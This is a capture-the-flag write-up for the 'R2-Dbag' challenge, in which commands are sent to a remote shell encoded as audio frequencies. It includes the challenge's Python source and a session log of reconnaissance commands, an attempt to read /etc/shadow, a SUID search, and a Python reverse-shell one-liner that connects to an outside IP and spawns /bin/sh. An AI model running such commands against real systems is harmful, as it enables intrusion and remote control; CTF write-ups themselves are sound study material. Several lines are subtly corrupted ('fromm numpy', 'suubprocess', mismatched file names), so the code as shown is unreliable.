# R2-Dbag
**Category**: misc

420 Points

17 Solves

**Problem description**:
```
R2-Dbag is listening to what you're telling him and is willing to do what you're asking.

Note: this challenge is the follow up of GongFou, which should be solved first.

Note 2: This challenge was tested on Ubuntu 16.04 and works fine. It seems there are problems with some versions of nc though. Try option -q 1 (which fixes the problem in Debian or Kali, that use /bin/nc.traditional).

nc r2dbag.420blaze.in 420

Author: DuSu
```
---

This is another digital signal processing problem, a follow up to GongFou, except now we are asked to encode the signals ourselves.

Essentially, we have a remote shell but all tx/rx is encoded as r2dbag protocol.

Using numpy, this is pretty easy, but unfortunately the shell seems to truncate output at 64 bytes.
That's not a big deal, we can just use `head` to pageinate or a backconnect to upgrade to a 'full' shell.

```
$ ls
R2-Dbag.py
bin
boot
dev
etc
home
lib
lib64
lib_sound_R2_Dbag.py

media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

$ cat lib_sound_R2_Dbag.py
#!/usr/bin/env python

import math
import wave
import array
fromm numpy import fft

# global settings
NCHAN = 1 # mono
NBITS = 16 # 16-bit ADC
NBYTES = NBITS / 8
MAXV = 2 ** (NBITS - 1) - 1 # maximum value
FP = 2 ** 5 # "pulse" (coding byte) duration is 1 / FP
FS = 2 ** 15 # sampling frequency
N = FS // FP # number of samples per "pulse"
BASE = 128 # base frequency in units of FP
FB = BASE * FP # base frequency
GAP = 8 # gap between two frequencies in units of FP
FG = GAP * FP # gap between two frequencies

def hann(i):
    return (1.0 - math.cos(2 * math.pi * i / (N - 1))) / 2.0

def cosine(i, f):
    return math.cos(2 * math.pi * f * i / FS)

def byte_to_cosines(byte, i):
    res = cosine(i, FB)
    nb = 1
    b = 1
    while byte:
        if byte & 1:
            res += cosine(i, FB + b * FG)
            nb += 1
        b += 1
        byte >>= 1
    res *= MAXV / nb
    return res

def byte_to_pulse(byte):
    pulse = array.array('h')
    for i in range(N):
        pulse.append(int(byte_to_cosines(byte, i)
            * hann(i)))
    return pulse

def string_to_pulses(string):
    pulses = array.array('h')
    for c in string:
        pulses.extend(byte_to_pulse(ord(c)))
    return pulses

def pulse_to_byte(pulse):
    ft = map(abs, fft.rfft(pulse))
    s = sum(ft)
    ft /= s
    m = max(ft)
    if ft[BASE] < m / 2:
        print('Byte Format Error')
        exit(0)
    res = 0;
    for i in range(8, 0, -1):
        res <<= 1
        if ft[BASE + GAP * i] > m / 2:
            res += 1
    return res

def write_string_to_wave(string, filename):
    try:
        f = wave.open(filename, 'w')
    except wave.Error:
        print('ENOWAV')
        exit(0)
    pulses = string_to_pulses(string)
    assert len(string) * N == len(pulses)
    f.setparams((NCHAN, NBYTES, FS, len(string) * N, 'NONE', 'Uncompressed'))
    f.writeframes(pulses.tostring())
    f.close()

def read_wave_to_string(filename):
    try:
        f = wave.open(filename, 'r')
    except:
        print('ENOWAV')
        exit(0)
    (nchannels, sampwidth, framerate, nframes, comptype, compname) = f.getparams()
    pulses = array.array('h', f.readframes(nframes))
    f.close()

    string = ''
    for i in range(len(pulses) // N):
        pulse  = pulses[N * i : N * (i + 1)]
        byte = pulse_to_byte(pulse)
        string += chr(byte)
    return string

$ cat R2-Dbag.py
#!/usr/bin/env python

from lib_sound_R2_Dbag import *
import suubprocess
import sys
import StringIO

MAX_LEN = 64

rcv = StringIO.StringIO(sys.stdin.read())
dec = read_wave_to_string(rcv)
if len(dec) < 6:
    print("Message too short")
    exit(0)
if dec[0] != '\xff':
    print('First byte must be \\xff')
    exit(0)
if dec[-1] != '\xff':
    print('Last byte must be \\xff')
    exit(0)
action = dec[1:5]
if action != 'EXEC':
    print('Action "%s" is not implemented, use EXEC' % action)
    exit(0)
cmd = dec[5:-1]
res = subprocess.Popen(cmd, shell = True,
    stdout = subprocess.PIPE).stdout.read()
output = StringIO.StringIO()
if len(res) > MAX_LEN:
    res = res[0:MAX_LEN] + '<snip>'
write_string_to_wave(res, output)
print(output.getvalue())
output.close()

$ ping google.com -n 1
None
$ ls /root
None
$ Linux a2fe9c7f22ef 4.4.0-1052-aws #61-Ubuntu SMP Mon Feb 12 23:005:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

$ eth0      Link encap:Ethernet  HWaddr 02:42:ac:11:00:02  
           inet addr:172.17.0.2  Bcast:0.0.0.0  Mask:255.255.0.0
          inet6 addr: fe80::42:acff:fe11:2/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1233 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1476 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1568158 (1.5 MB)  TX bytes:2979359 (2.9 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)


$ whoami
r2dbag

$ ls -lah
total 80K
drwxr-xr-x  47 root root 4.0K Apr 23 05:04 .
drwxr-xr--x  47 root root 4.0K Apr 23 05:04 ..
-rwxr-xr-x   1 root root    0 Apr 23 05:04 .dockerenv
-rwx---r-x   1 root root  738 Apr 21 07:41 R2-Dbag.py
drwxr-xr-x   2 root root 4.0K Apr 12 10:33 bin
drwxr-xr-x   2 root root 4.0K Apr 10  2014 boot
drwxr-xr-x   5 root root  340 Apr 23 05:04 dev
drwxr-xr-x  71 root root 4.0K Apr 23 05:04 etc
drwxr-xr-x   4 root root 4.0K Apr 21 07:41 home
drwxr-xr-x  13 root root 4.0K Apr 20 10:02 lib
drwxr-xr-x   2 root root 4.0K Apr 12 10:30 lib64
-r-x---r-x   1 root root 2.1K Apr 20 09:50 lib_sound_R2_Dbag.py
drwxr-xr-x   2 root root 4.0K Apr 12 10:29 media
drwxr-xr-x   2 root root 4.0K Apr 10  2014 mnt
drwxr-xr-x   2 root root 4.0K Apr 12 10:29 opt
dr-xr-xr-x 134 root root    0 Apr 23 05:04 proc
drwx------   2 root root 4.0K Apr 12 10:33 root
drwxr-xr-x   8 root root 4.0K Apr 12 18:39 run
drwxr-xr-x   2 root root 4.0K Apr 12 18:39 sbin
drwxr-xr-x   2 root root 4.0K Apr 12 10:29 srv
dr-xr-xr-x  13 root root    0 Apr 20 10:24 sys
drwxrwxrwt   2 root root 4.0K Apr 20 10:02 tmp
drwxr-xr-x  18 root root 4.0K Apr 20 10:02 usr
drwxr-xr-x  19 root root 4.0K Apr 20 10:02 var

$ cat /etc/shadow
None
$ ls ~
flag1.txt
flag2.txt
flag3.txt
flag4.txt
flag5.txt
flag6.txt
flagg7.txt
flag8.txt
flag9.txt
r2-dflag_is_here.txt

$ cat r2-dflag_is_here.txt
blaze{Sp34kinG_R2-Dbag_LanGuaG3_fLu3nTlY}

$ find / -perm -g=s -type f 2>/dev/null
None
$ ls -l ~/r2-dflag_is_here.txt
-r-x---r-x 1 root root 42 Apr 20 09:39 /home/r2dbag/r2-dflag_is__here.txt
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("123.123.123.123",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
None

```

